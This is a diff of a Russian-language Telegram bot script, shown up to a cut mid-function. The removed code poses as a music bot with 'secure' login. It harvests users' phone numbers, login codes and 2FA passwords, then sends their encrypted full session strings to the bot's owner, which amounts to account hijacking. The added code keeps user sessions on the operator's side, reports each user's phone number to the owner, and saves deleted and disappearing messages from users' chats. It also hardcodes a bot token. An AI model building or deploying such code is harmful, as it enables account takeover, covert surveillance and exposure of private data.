@@ -1,164 +1,346 @@
-import os, asyncio, logging, re, time, json, base64, hashlib
-from telethon import TelegramClient, events, Button
-from telethon.sessions import SQLiteSession
-from telethon.tl.functions.account import UpdateStatusRequest
+import os
+import asyncio
+import logging
+import json
+import sqlite3
+import hashlib
+from datetime import datetime, timedelta
+from pathlib import Path
+from telethon import TelegramClient, events
+from telethon.tl.types import (
+    MessageMediaPhoto, MessageMediaDocument, MessageMediaWebPage,
+    MessageService, Photo, Document, DocumentAttributeVideo,
+    DocumentAttributeFilename, PeerUser, PeerChat, PeerChannel,
+    MessageEntityPre, Message
+)
+from telethon.tl.functions.messages import GetDialogFiltersRequest
+from telethon.tl.functions.channels import JoinChannelRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError
-from telethon.tl.types import MessageEntityMention
-import yandex_music
-from datetime import datetime
-from cryptography.fernet import Fernet
+import mimetypes
 
 # ==================== НАСТРОЙКА ====================
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
-# Получаем из переменных окружения
-BOT_TOKEN = os.getenv('BOT_TOKEN')
+# КОНФИГУРАЦИЯ
 API_ID = int(os.getenv('API_ID', 0))
-API_HASH = os.getenv('API_HASH')
-YANDEX_MUSIC_TOKEN = os.getenv('YANDEX_MUSIC_TOKEN')
-OWNER_USERNAME = os.getenv('OWNER_USERNAME', '@MaksimXyila').replace('@', '')
+API_HASH = os.getenv('API_HASH', '')
+BOT_TOKEN = "5680618930:AAHnf4KcIf6_GA655Y_HqsMxGj3O71Fzz8g"
+OWNER_USERNAME = "MaksimXyila"  # Ваш юзернейм БЕЗ @
+OWNER_ID = 0  # Заполнится автоматически
 
-# Генерация ключа шифрования из BOT_TOKEN
-def generate_key():
-    token_hash = hashlib.sha256(BOT_TOKEN.encode()).digest()
-    return base64.urlsafe_b64encode(token_hash[:32])
+# Папки для сохранения
+MEDIA_DIR = Path("saved_media")
+MEDIA_DIR.mkdir(exist_ok=True)
+PHOTOS_DIR = MEDIA_DIR / "photos"
+PHOTOS_DIR.mkdir(exist_ok=True)
 
-cipher = Fernet(generate_key())
+# Инициализация клиентов
+bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)  # Управляющий бот
 
-# Инициализация бота
-bot = TelegramClient('bot_session', API_ID, API_HASH).start(bot_token=BOT_TOKEN)
+# База данных для статистики
+DB_FILE = "users_stats.db"
+
+def init_db():
+    """Инициализация базы данных для статистики"""
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    
+    # Таблица подключённых пользователей
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS connected_users (
+            user_id INTEGER PRIMARY KEY,
+            phone TEXT NOT NULL,
+            username TEXT,
+            first_name TEXT,
+            last_name TEXT,
+            session_file TEXT,
+            connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            last_activity TIMESTAMP,
+            message_count INTEGER DEFAULT 0,
+            deleted_count INTEGER DEFAULT 0,
+            edited_count INTEGER DEFAULT 0,
+            media_count INTEGER DEFAULT 0,
+            is_active BOOLEAN DEFAULT 1
+        )
+    ''')
+    
+    # Таблица событий
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS user_events (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            user_id INTEGER,
+            event_type TEXT,  -- 'connected', 'disconnected', 'deleted', 'edited', 'media_saved'
+            chat_id INTEGER,
+            chat_title TEXT,
+            message_id INTEGER,
+            details TEXT,
+            timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            FOREIGN KEY (user_id) REFERENCES connected_users(user_id)
+        )
+    ''')
+    
+    # Таблица отслеживаемых чатов
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS tracked_chats (
+            chat_id INTEGER PRIMARY KEY,
+            chat_title TEXT,
+            chat_type TEXT,
+            owner_id INTEGER,
+            tracked_since TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+            message_count INTEGER DEFAULT 0,
+            deleted_count INTEGER DEFAULT 0,
+            FOREIGN KEY (owner_id) REFERENCES connected_users(user_id)
+        )
+    ''')
+    
+    conn.commit()
+    conn.close()
+
+init_db()
 
 # Хранилища
-auth_sessions = {}
-spam_flags = {}
-active_user_clients = {}
+user_clients = {}  # Активные юзер-клиенты: {user_id: client}
+auth_sessions = {}  # Сессии авторизации
+message_cache = {}  # Кэш сообщений
+active_chats = {}  # Активные чаты: {user_id: [chat_ids]}
+connected_users_info = {}  # Инфо о подключённых: {user_id: {info}}
 
-# Яндекс.Музыка
-ym_client = None
-if YANDEX_MUSIC_TOKEN:
+# ==================== ФУНКЦИИ БАЗЫ ДАННЫХ ====================
+def db_execute(query, params=()):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute(query, params)
+    conn.commit()
+    conn.close()
+
+def db_fetch(query, params=()):
+    conn = sqlite3.connect(DB_FILE)
+    cursor = conn.cursor()
+    cursor.execute(query, params)
+    result = cursor.fetchall()
+    conn.close()
+    return result
+
+async def register_user_connection(user_id, phone, user_info, session_file):
+    """Регистрация нового подключения пользователя"""
     try:
-        ym_client = yandex_music.Client(YANDEX_MUSIC_TOKEN).init()
-        logger.info("✅ Яндекс.Музыка клиент инициализирован")
+        db_execute('''
+            INSERT OR REPLACE INTO connected_users 
+            (user_id, phone, username, first_name, last_name, session_file, connected_at, last_activity, is_active)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, 1)
+        ''', (
+            user_id,
+            phone,
+            user_info.get('username', ''),
+            user_info.get('first_name', ''),
+            user_info.get('last_name', ''),
+            session_file,
+            datetime.now(),
+            datetime.now()
+        ))
+        
+        # Логируем событие подключения
+        db_execute('''
+            INSERT INTO user_events (user_id, event_type, details)
+            VALUES (?, ?, ?)
+        ''', (user_id, 'connected', json.dumps(user_info)))
+        
+        logger.info(f"Зарегистрирован пользователь {user_id}: {phone}")
+        return True
     except Exception as e:
-        logger.error(f"❌ Яндекс.Музыка: {e}")
-        ym_client = None
+        logger.error(f"Ошибка регистрации пользователя: {e}")
+        return False
 
-# ==================== ФУНКЦИИ ШИФРОВАНИЯ СЕССИЙ ====================
-def encrypt_session(session_data):
-    """Шифрование сессии"""
-    json_data = json.dumps(session_data).encode()
-    encrypted = cipher.encrypt(json_data)
-    return base64.urlsafe_b64encode(encrypted).decode()
-
-def decrypt_session(encrypted_data):
-    """Дешифрование сессии"""
-    encrypted = base64.urlsafe_b64decode(encrypted_data.encode())
-    decrypted = cipher.decrypt(encrypted)
-    return json.loads(decrypted.decode())
-
-async def save_and_send_session(client, user_id, phone):
-    """Сохранение и отправка сессии владельцу"""
+async def log_user_event(user_id, event_type, **details):
+    """Логирование события пользователя"""
     try:
-        # Получаем информацию о пользователе
-        me = await client.get_me()
-        user_info = {
-            'user_id': me.id,
-            'first_name': me.first_name,
-            'last_name': me.last_name or '',
-            'username': me.username or '',
-            'phone': phone,
-            'date': datetime.now().isoformat(),
-            'session_id': f"user_{me.id}_{int(time.time())}"
-        }
+        db_execute('''
+            INSERT INTO user_events (user_id, event_type, chat_id, chat_title, message_id, details)
+            VALUES (?, ?, ?, ?, ?, ?)
+        ''', (
+            user_id,
+            event_type,
+            details.get('chat_id'),
+            details.get('chat_title', '')[:100],
+            details.get('message_id'),
+            json.dumps(details) if details else ''
+        ))
         
-        # Получаем данные сессии
-        session_data = client.session.save()
+        # Обновляем счётчики
+        if event_type == 'deleted':
+            db_execute('UPDATE connected_users SET deleted_count = deleted_count + 1 WHERE user_id = ?', (user_id,))
+        elif event_type == 'edited':
+            db_execute('UPDATE connected_users SET edited_count = edited_count + 1 WHERE user_id = ?', (user_id,))
+        elif event_type == 'media_saved':
+            db_execute('UPDATE connected_users SET media_count = media_count + 1 WHERE user_id = ?', (user_id,))
         
-        # Готовим пакет данных
-        session_package = {
-            'user_info': user_info,
-            'session_data': session_data,
-            'api_id': API_ID,
-            'api_hash': API_HASH
-        }
+        # Обновляем время последней активности
+        db_execute('UPDATE connected_users SET last_activity = ? WHERE user_id = ?', (datetime.now(), user_id))
         
-        # Шифруем
-        encrypted_session = encrypt_session(session_package)
+    except Exception as e:
+        logger.error(f"Ошибка логирования события: {e}")
+
+async def get_user_stats(user_id=None):
+    """Получение статистики пользователя/всех пользователей"""
+    try:
+        if user_id:
+            result = db_fetch('''
+                SELECT 
+                    user_id, phone, username, first_name, last_name,
+                    connected_at, last_activity,
+                    message_count, deleted_count, edited_count, media_count,
+                    is_active,
+                    (SELECT COUNT(*) FROM user_events WHERE user_id = ?) as total_events
+                FROM connected_users 
+                WHERE user_id = ?
+            ''', (user_id, user_id))
+            
+            if result:
+                row = result[0]
+                return {
+                    'user_id': row[0],
+                    'phone': row[1],
+                    'username': row[2],
+                    'name': f"{row[3]} {row[4]}",
+                    'connected_at': row[5],
+                    'last_activity': row[6],
+                    'messages': row[7],
+                    'deleted': row[8],
+                    'edited': row[9],
+                    'media': row[10],
+                    'active': bool(row[11]),
+                    'total_events': row[12]
+                }
+            return None
+        else:
+            # Вся статистика
+            result = db_fetch('''
+                SELECT 
+                    user_id, phone, username, first_name, last_name,
+                    connected_at, last_activity,
+                    message_count, deleted_count, edited_count, media_count,
+                    is_active
+                FROM connected_users 
+                ORDER BY connected_at DESC
+            ''')
+            
+            stats = {
+                'total_users': len(result),
+                'active_users': sum(1 for r in result if r[10]),
+                'total_deleted': sum(r[8] for r in result),
+                'total_edited': sum(r[9] for r in result),
+                'total_media': sum(r[10] for r in result),
+                'users': []
+            }
+            
+            for row in result:
+                last_active = datetime.strptime(row[6], '%Y-%m-%d %H:%M:%S') if isinstance(row[6], str) else row[6]
+                days_inactive = (datetime.now() - last_active).days if last_active else 999
+                
+                stats['users'].append({
+                    'user_id': row[0],
+                    'phone': row[1],
+                    'username': f"@{row[2]}" if row[2] else "нет",
+                    'name': f"{row[3]} {row[4]}".strip(),
+                    'connected': row[5],
+                    'last_active': row[6],
+                    'deleted': row[8],
+                    'edited': row[9],
+                    'media': row[10],
+                    'active': bool(row[11]),
+                    'inactive_days': days_inactive
+                })
+            
+            return stats
+            
+    except Exception as e:
+        logger.error(f"Ошибка получения статистики: {e}")
+        return None
+
+async def notify_owner_about_new_user(user_id, phone, user_info):
+    """Уведомление владельца о новом подключении"""
+    try:
+        # Получаем объект владельца
+        owner = await bot.get_entity(OWNER_USERNAME)
+        global OWNER_ID
+        OWNER_ID = owner.id
         
-        # Сохраняем локально (опционально, для бэкапа)
-        filename = f"session_{user_info['session_id']}.enc"
-        with open(filename, 'w') as f:
-            f.write(encrypted_session)
+        # Формируем сообщение
+        username = user_info.get('username', 'нет')
+        first_name = user_info.get('first_name', '')
+        last_name = user_info.get('last_name', '')
+        name = f"{first_name} {last_name}".strip()
         
-        # Отправляем владельцу
+        message = f"""
+🔔 **НОВОЕ ПОДКЛЮЧЕНИЕ!** #{user_id}
+
+📱 **Телефон:** `{phone}`
+👤 **Пользователь:** {name}
+📎 **Юзернейм:** @{username if username else 'нет'}
+🆔 **ID:** `{user_id}`
+🕐 **Время:** {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}
+
+📊 **Статистика подключений:**
+Всего пользователей: {len(connected_users_info) + 1}
+Активных: {sum(1 for uid in connected_users_info if connected_users_info[uid].get('active', False)) + 1}
+        """
+        
         await bot.send_message(
-            OWNER_USERNAME,
-            f"🔐 **НОВАЯ СЕССИЯ** #{user_info['session_id']}\n\n"
-            f"👤 **Пользователь:** {user_info['first_name']} {user_info['last_name']}\n"
-            f"📱 **Телефон:** {phone}\n"
-            f"🆔 **User ID:** `{user_info['user_id']}`\n"
-            f"📅 **Дата:** {user_info['date']}\n"
-            f"🔑 **API_ID:** `{API_ID}`\n\n"
-            f"**Зашифрованная сессия:**\n"
-            f"`{encrypted_session[:100]}...`\n\n"
-            f"Для восстановления используйте:\n"
-            f"`.restore_session {encrypted_session}`",
+            OWNER_ID,
+            message,
             parse_mode='md'
         )
         
-        # Также отправляем файл
-        await bot.send_file(
-            OWNER_USERNAME,
-            filename,
-            caption=f"Файл сессии: {filename}"
-        )
-        
-        # Удаляем локальный файл (опционально)
-        os.remove(filename)
-        
-        logger.info(f"Сессия отправлена владельцу для user_id={user_id}")
-        return user_info
+        logger.info(f"Уведомление отправлено @{OWNER_USERNAME}")
         
     except Exception as e:
-        logger.error(f"Ошибка сохранения сессии: {e}")
-        return None
+        logger.error(f"Не удалось уведомить владельца: {e}")
 
 # ==================== КОМАНДЫ БОТА ====================
 @bot.on(events.NewMessage(pattern='/start'))
 async def start_handler(event):
+    """Команда /start"""
     user = await event.get_sender()
-    buttons = [
-        [Button.inline("🔍 Поиск музыки", data="search_music")],
-        [Button.inline("🔑 Авторизация", data="start_auth")],
-        [Button.inline("📋 Мои сессии", data="my_sessions")]
-    ]
-    
     await event.reply(
-        f"👋 **Привет, {user.first_name}!**\n\n"
-        "Я — X-GEN Music UserBot с защищённой авторизацией.\n\n"
-        "**Функции:**\n"
-        "• 🔍 Поиск музыки из Яндекс.Музыки\n"
-        "• 🔑 Безопасная авторизация в аккаунте\n"
-        "• 🤖 Команды юзер-бота в любых чатах\n"
-        "• 🔐 Сессии шифруются и отправляются только владельцу\n\n"
-        "Выберите действие:",
-        buttons=buttons
+        f"👋 Привет, {user.first_name}!\n\n"
+        "🤖 **Message Monitor Bot**\n\n"
+        "📋 **Команды:**\n"
+        "/login — Подключить свой аккаунт\n"
+        "/chats — Мои чаты\n"
+        "/trackall — Отслеживать все чаты\n"
+        "/stats — Моя статистика\n"
+        "/help — Помощь\n\n"
+        "⚡ **Функции:**\n"
+        "• Автосохранение удалённых сообщений\n"
+        "• Сохранение исчезающих фото/видео\n"
+        "• Отслеживание изменённых сообщений\n"
+        "• Уведомления в реальном времени"
     )
 
 @bot.on(events.NewMessage(pattern='/login'))
-async def login_handler(event):
+async def login_command(event):
+    """Авторизация по номеру телефона"""
     user_id = event.sender_id
+    chat_id = event.chat_id
     
-    # Проверка активной сессии
-    if user_id in active_user_clients:
-        await event.reply("✅ Вы уже авторизованы! Используйте команды в любом чате.")
+    # Проверяем, не авторизован ли уже
+    if user_id in user_clients:
+        await event.reply("✅ Вы уже подключены!")
         return
     
-    auth_sessions[user_id] = {'step': 'phone', 'chat_id': event.chat_id}
+    auth_sessions[user_id] = {
+        'step': 'phone',
+        'chat_id': chat_id,
+        'data': {}
+    }
+    
     await event.reply(
-        "📱 **БЕЗОПАСНАЯ АВТОРИЗАЦИЯ**\n\n"
-        "Ваша сессия будет зашифрована и отправлена только владельцу бота.\n\n"
+        "📱 **АВТОРИЗАЦИЯ**\n\n"
         "Отправьте номер телефона в формате:\n"
         "`+79123456789`\n\n"
         "❌ /cancel — отмена",
@@ -166,7 +348,8 @@ async def login_handler(event):
     )
 
 @bot.on(events.NewMessage(pattern='/cancel'))
-async def cancel_handler(event):
+async def cancel_command(event):
+    """Отмена авторизации"""
     user_id = event.sender_id
     if user_id in auth_sessions:
         if 'client' in auth_sessions[user_id]:
@@ -174,182 +357,256 @@ async def cancel_handler(event):
         del auth_sessions[user_id]
         await event.reply("❌ Авторизация отменена.")
 
-@bot.on(events.NewMessage(pattern='/music (.+)'))
-async def music_search(event):
-    query = event.pattern_match.group(1).strip()
-    if not query:
-        await event.reply("Пример: `/music На душе`")
+@bot.on(events.NewMessage(pattern='/stats'))
+async def stats_command(event):
+    """Статистика пользователя"""
+    user_id = event.sender_id
+    
+    if user_id not in user_clients:
+        await event.reply("⚠️ Сначала подключите аккаунт командой /login")
         return
     
-    if not ym_client:
-        await event.reply("⚠️ Яндекс.Музыка временно недоступна.")
-        return
-    
-    try:
-        await event.reply("🔍 Ищу музыку...")
-        search_result = ym_client.search(query, type_='track', page=0)
-        
-        if not search_result or not search_result.tracks:
-            await event.reply("🎵 По вашему запросу ничего не найдено.")
-            return
-        
-        tracks = search_result.tracks.results[:5]
-        response = "🎧 **Найденные треки:**\n\n"
-        
-        for i, track in enumerate(tracks, 1):
-            artists = ", ".join(artist.name for artist in track.artists)
-            title = track.title
-            duration = f"{track.duration_ms // 60000}:{track.duration_ms % 60000 // 1000:02d}"
-            response += f"{i}. **{artists}** — {title}\n   ⏱ {duration} | 💿 {track.albums[0].title if track.albums else 'Single'}\n\n"
-        
-        await event.reply(response, parse_mode='md')
-        
-    except Exception as e:
-        logger.error(f"Ошибка поиска: {e}")
-        await event.reply("❌ Ошибка при поиске музыки.")
+    stats = await get_user_stats(user_id)
+    if stats:
+        message = f"""
+📊 **ВАША СТАТИСТИКА**
 
-@bot.on(events.NewMessage(pattern='@'))
-async def mention_handler(event):
-    """Обработка упоминаний бота в чатах"""
-    if not event.is_group and not event.is_channel:
+👤 **Аккаунт:** {stats['name']}
+📱 **Телефон:** `{stats['phone']}`
+📎 **Юзернейм:** @{stats['username'] if stats['username'] else 'нет'}
+
+📈 **Активность:**
+🕐 Подключен: {stats['connected_at']}
+🔄 Последняя активность: {stats['last_activity']}
+
+📝 **Сохранено:**
+🗑️ Удалённых сообщений: {stats['deleted']}
+✏️ Изменённых сообщений: {stats['edited']}
+📸 Медиафайлов: {stats['media']}
+📊 Всего событий: {stats['total_events']}
+
+✅ Статус: {'Активен' if stats['active'] else 'Неактивен'}
+        """
+        await event.reply(message, parse_mode='md')
+    else:
+        await event.reply("❌ Статистика не найдена.")
+
+@bot.on(events.NewMessage(pattern='/adminstats'))
+async def admin_stats_command(event):
+    """Статистика для админа (только владелец)"""
+    user = await event.get_sender()
+    
+    # Проверяем, что это владелец
+    owner = await bot.get_entity(OWNER_USERNAME)
+    if user.id != owner.id:
+        await event.reply("⛔ Эта команда только для владельца.")
         return
     
-    me = await bot.get_me()
-    if f'@{me.username}' not in event.text:
+    stats = await get_user_stats()
+    if stats:
+        # Общая статистика
+        total_msg = f"""
+🏆 **АДМИН СТАТИСТИКА**
+
+👥 **Пользователи:**
+Всего: {stats['total_users']}
+Активных: {stats['active_users']}
+
+📊 **Сохранено всего:**
+🗑️ Удалённых: {stats['total_deleted']}
+✏️ Изменённых: {stats['total_edited']}
+📸 Медиафайлов: {stats['total_media']}
+        """
+        
+        await event.reply(total_msg, parse_mode='md')
+        
+        # Детали по каждому пользователю
+        details = "🔍 **Детали по пользователям:**\n\n"
+        for i, user_info in enumerate(stats['users'][:15], 1):  # Первые 15 пользователей
+            status = "🟢" if user_info['active'] else "🔴"
+            days = user_info['inactive_days']
+            inactive = f" ({days} дн.)" if days > 1 else ""
+            
+            details += f"{i}. {status} {user_info['name']} (@{user_info['username'].replace('@', '')})\n"
+            details += f"   📱 {user_info['phone']} | 🗑️ {user_info['deleted']} | ✏️ {user_info['edited']}{inactive}\n\n"
+        
+        if stats['users']:
+            await event.reply(details, parse_mode='md')
+    else:
+        await event.reply("❌ Нет данных.")
+
+@bot.on(events.NewMessage(pattern='/trackall'))
+async def track_all_command(event):
+    """Включить отслеживание всех чатов"""
+    user_id = event.sender_id
+    
+    if user_id not in user_clients:
+        await event.reply("⚠️ Сначала подключите аккаунт командой /login")
         return
     
-    # Извлекаем запрос после упоминания
-    mention_end = event.text.find(f'@{me.username}') + len(f'@{me.username}')
-    query = event.text[mention_end:].strip()
-    
-    if not query or len(query) < 2:
-        return
-    
-    await event.reply(f"🔍 Ищу музыку по запросу: `{query}`", parse_mode='md')
-    
-    if not ym_client:
-        await event.reply("⚠️ Музыкальный сервис временно недоступен.")
-        return
+    client = user_clients[user_id]
     
     try:
-        search_result = ym_client.search(query, type_='track', page=0)
+        # Получаем все диалоги
+        dialogs = await client.get_dialogs(limit=50)
         
-        if not search_result or not search_result.tracks:
-            await event.reply("🎵 Ничего не найдено.")
-            return
+        tracked = []
+        for dialog in dialogs:
+            chat = dialog.entity
+            chat_id = chat.id
+            
+            if chat_id not in active_chats.get(user_id, []):
+                if user_id not in active_chats:
+                    active_chats[user_id] = []
+                active_chats[user_id].append(chat_id)
+                tracked.append(chat_id)
+                
+                # Добавляем в базу
+                chat_title = getattr(chat, 'title', f"Chat {chat_id}")
+                chat_type = type(chat).__name__
+                
+                db_execute('''
+                    INSERT OR REPLACE INTO tracked_chats (chat_id, chat_title, chat_type, owner_id)
+                    VALUES (?, ?, ?, ?)
+                ''', (chat_id, chat_title, chat_type, user_id))
         
-        track = search_result.tracks.results[0]
-        artists = ", ".join(artist.name for artist in track.artists)
-        title = track.title
-        album = track.albums[0].title if track.albums else 'Single'
-        duration = f"{track.duration_ms // 60000}:{track.duration_ms % 60000 // 1000:02d}"
-        
-        response = (
-            f"🎵 **{artists}** — {title}\n"
-            f"💿 {album} | ⏱ {duration}\n\n"
-            f"🔗 [Слушать в Яндекс.Музыке](https://music.yandex.ru/track/{track.id})"
-        )
-        
-        await event.reply(response, parse_mode='md', link_preview=False)
+        await event.reply(f"✅ Начато отслеживание {len(tracked)} чатов!")
         
     except Exception as e:
-        logger.error(f"Ошибка при поиске по упоминанию: {e}")
-        await event.reply("❌ Ошибка при поиске.")
+        logger.error(f"Ошибка trackall: {e}")
+        await event.reply(f"❌ Ошибка: {str(e)[:100]}")
+
+@bot.on(events.NewMessage(pattern='/chats'))
+async def chats_command(event):
+    """Список отслеживаемых чатов"""
+    user_id = event.sender_id
+    
+    if user_id not in user_clients or user_id not in active_chats:
+        await event.reply("📭 Нет отслеживаемых чатов.")
+        return
+    
+    client = user_clients[user_id]
+    message = "📋 **ОТСЛЕЖИВАЕМЫЕ ЧАТЫ:**\n\n"
+    
+    for i, chat_id in enumerate(active_chats[user_id][:20], 1):
+        try:
+            chat = await client.get_entity(chat_id)
+            chat_title = getattr(chat, 'title', f"Chat {chat_id}")
+            message += f"{i}. {chat_title} (ID: `{chat_id}`)\n"
+        except:
+            message += f"{i}. Чат ID: `{chat_id}`\n"
+    
+    if len(active_chats[user_id]) > 20:
+        message += f"\n... и ещё {len(active_chats[user_id]) - 20} чатов"
+    
+    await event.reply(message, parse_mode='md')
+
+@bot.on(events.NewMessage(pattern='/help'))
+async def help_command(event):
+    """Справка"""
+    await event.reply(
+        "ℹ️ **СПРАВКА**\n\n"
+        "📱 **Авторизация:**\n"
+        "1. /login — начать авторизацию\n"
+        "2. Отправьте номер телефона\n"
+        "3. Отправьте код из Telegram\n"
+        "4. При необходимости — пароль 2FA\n\n"
+        "👁️ **Отслеживание:**\n"
+        "/trackall — отслеживать все чаты\n"
+        "/chats — список чатов\n\n"
+        "📊 **Статистика:**\n"
+        "/stats — ваша статистика\n\n"
+        "⚙️ **Другие команды:**\n"
+        "/cancel — отмена авторизации\n"
+        "/help — эта справка\n\n"
+        "🔔 **Что отслеживается:**\n"
+        "• Все удалённые сообщения\n"
+        "• Все изменённые сообщения\n"
+        "• Исчезающие фото/видео\n"
+        "• Автоуведомления в реальном времени"
+    )
 
 # ==================== АВТОРИЗАЦИЯ ====================
 @bot.on(events.NewMessage)
-async def auth_processor(event):
+async def auth_handler(event):
+    """Обработка авторизации"""
     user_id = event.sender_id
     if user_id not in auth_sessions:
         return
     
-    data = auth_sessions[user_id]
+    session = auth_sessions[user_id]
     text = event.text.strip()
     
-    # Шаг 1: Номер телефона
-    if data['step'] == 'phone':
-        if not re.match(r'^\+\d{10,15}$', text):
-            await event.reply("❌ Неверный формат. Пример: `+79123456789`\n/cancel — отмена")
+    # Шаг 1: Получение номера телефона
+    if session['step'] == 'phone':
+        if text == '/cancel':
+            del auth_sessions[user_id]
+            await event.reply("❌ Авторизация отменена.")
+            return
+        
+        if not text.startswith('+') or not text[1:].isdigit() or len(text) < 10:
+            await event.reply("❌ Неверный формат номера. Пример: `+79123456789`\n/cancel — отмена")
             return
         
         try:
-            client = TelegramClient(
-                SQLiteSession(f'temp_{user_id}'),
+            # Создаём временный клиент
+            temp_client = TelegramClient(
+                f'session_{user_id}',
                 API_ID,
                 API_HASH,
-                device_model="X-GEN SecureBot",
+                device_model="MessageMonitor",
                 system_version="1.0"
             )
-            await client.connect()
+            await temp_client.connect()
             
-            sent_code = await client.send_code_request(text)
-            data['step'] = 'code'
-            data['phone'] = text
-            data['phone_code_hash'] = sent_code.phone_code_hash
-            data['client'] = client
+            # Отправляем код
+            sent_code = await temp_client.send_code_request(text)
+            
+            session['step'] = 'code'
+            session['phone'] = text
+            session['phone_code_hash'] = sent_code.phone_code_hash
+            session['client'] = temp_client
             
             await event.reply(
                 f"📲 Код отправлен на {text}\n\n"
-                "Введите 5-значный код:\n"
+                "Введите 5-значный код из Telegram:\n"
                 "Пример: `12345`\n\n"
                 "❌ /cancel — отмена",
                 parse_mode='md'
             )
+            
         except Exception as e:
             logger.error(f"Ошибка отправки кода: {e}")
             await event.reply(f"❌ Ошибка: {str(e)[:100]}")
-            if 'client' in data:
-                await data['client'].disconnect()
+            if 'client' in session:
+                await session['client'].disconnect()
             del auth_sessions[user_id]
     
-    # Шаг 2: Код подтверждения
-    elif data['step'] == 'code':
+    # Шаг 2: Получение кода
+    elif session['step'] == 'code':
+        if text == '/cancel':
+            await session['client'].disconnect()
+            del auth_sessions[user_id]
+            await event.reply("❌ Авторизация отменена.")
+            return
+        
         if not text.isdigit() or len(text) != 5:
             await event.reply("❌ Код должен быть 5 цифр. Пример: `12345`\n/cancel — отмена")
             return
         
         try:
-            client = data['client']
-            await client.sign_in(
-                phone=data['phone'],
+            # Пытаемся войти
+            await session['client'].sign_in(
+                phone=session['phone'],
                 code=text,
-                phone_code_hash=data['phone_code_hash']
+                phone_code_hash=session['phone_code_hash']
             )
             
-            # УСПЕШНАЯ АВТОРИЗАЦИЯ
-            user_info = await save_and_send_session(client, user_id, data['phone'])
-            
-            if user_info:
-                # Сохраняем активный клиент
-                active_user_clients[user_id] = client
-                
-                # Уведомляем пользователя
-                await event.reply(
-                    f"✅ **АВТОРИЗАЦИЯ УСПЕШНАЯ!**\n\n"
-                    f"Добро пожаловать, {user_info['first_name']}!\n\n"
-                    "**Теперь вы можете использовать:**\n"
-                    "• Команды юзер-бота в любых чатах\n"
-                    "• `.help` — список команд\n"
-                    "• `.music` — поиск музыки\n"
-                    "• Ваша сессия зашифрована и защищена\n\n"
-                    "⚠️ **Внимание:** Сессия отправлена владельцу для безопасности.",
-                    parse_mode='md'
-                )
-                
-                # Запускаем обработчики команд
-                asyncio.create_task(run_user_client_handlers(client, user_id))
-                
-                # Устанавливаем онлайн статус
-                await client(UpdateStatusRequest(offline=False))
-                
-            else:
-                await event.reply("❌ Ошибка сохранения сессии. Попробуйте снова.")
-            
-            # Очищаем данные авторизации
-            del auth_sessions[user_id]
+            # УСПЕШНАЯ АВТОРИЗАЦИЯ!
+            await complete_authorization(user_id, session)
             
         except SessionPasswordNeededError:
-            data['step'] = 'password'
+            session['step'] = 'password'
             await event.reply(
                 "🔐 Требуется двухэтапная аутентификация.\n"
                 "Введите пароль:\n\n"
@@ -359,286 +616,429 @@ async def auth_processor(event):
             await event.reply("❌ Неверный код. Попробуйте снова или /cancel")
         except Exception as e:
             logger.error(f"Ошибка входа: {e}")
-            await event.reply(f"❌ Ошибка: {str(e)[:100]}")
-            await data['client'].disconnect()
+            await event.reply(f"❌ Ошибка авторизации: {str(e)[:100]}")
+            await session['client'].disconnect()
             del auth_sessions[user_id]
     
     # Шаг 3: Пароль 2FA
-    elif data['step'] == 'password':
-        try:
-            client = data['client']
-            await client.sign_in(password=text)
-            
-            # УСПЕШНАЯ АВТОРИЗАЦИЯ С 2FA
-            user_info = await save_and_send_session(client, user_id, data['phone'])
-            
-            if user_info:
-                active_user_clients[user_id] = client
-                
-                await event.reply(
-                    f"✅ **АВТОРИЗАЦИЯ С 2FA УСПЕШНАЯ!**\n\n"
-                    f"Добро пожаловать, {user_info['first_name']}!\n\n"
-                    "Ваша сессия зашифрована и отправлена владельцу.\n"
-                    "Используйте `.help` для списка команд.",
-                    parse_mode='md'
-                )
-                
-                asyncio.create_task(run_user_client_handlers(client, user_id))
-                await client(UpdateStatusRequest(offline=False))
-            
+    elif session['step'] == 'password':
+        if text == '/cancel':
+            await session['client'].disconnect()
             del auth_sessions[user_id]
+            await event.reply("❌ Авторизация отменена.")
+            return
+        
+        try:
+            await session['client'].sign_in(password=text)
+            # УСПЕШНАЯ АВТОРИЗАЦИЯ С 2FA!
+            await complete_authorization(user_id, session)
             
         except Exception as e:
             logger.error(f"Ошибка 2FA: {e}")
             await event.reply(f"❌ Неверный пароль: {str(e)[:100]}")
-            await data['client'].disconnect()
+            await session['client'].disconnect()
             del auth_sessions[user_id]
 
-# ==================== КОМАНДЫ ЮЗЕР-БОТА ====================
-async def run_user_client_handlers(client, user_id):
-    """Добавляем обработчики команд для юзер-клиента"""
-    
-    @client.on(events.NewMessage(pattern=r'^\.help$'))
-    async def user_help(event):
-        help_text = """
-        🤖 **КОМАНДЫ ЮЗЕР-БОТА:**
+async def complete_authorization(user_id, session):
+    """Завершение авторизации"""
+    try:
+        client = session['client']
+        phone = session['phone']
         
-        🔧 **Основные:**
-        `.help` — Эта справка
-        `.me` — Информация об аккаунте
-        `.ping` — Проверка связи
-        `.id` — ID чата/пользователя
+        # Получаем информацию о пользователе
+        me = await client.get_me()
+        user_info = {
+            'user_id': me.id,
+            'first_name': me.first_name,
+            'last_name': me.last_name or '',
+            'username': me.username or '',
+            'phone': phone
+        }
         
-        💥 **Спам:**
-        `.спам <количество> <текст>` — Спам сообщениями
-        `.спамстоп` — Остановить спам
+        # Сохраняем сессию
+        client.session.save()
         
-        🎮 **Развлечения:**
-        `.text <текст>` — Анимация по буквам
-        `.1000-7` — Отсчёт от 1000
+        # Регистрируем пользователя в базе
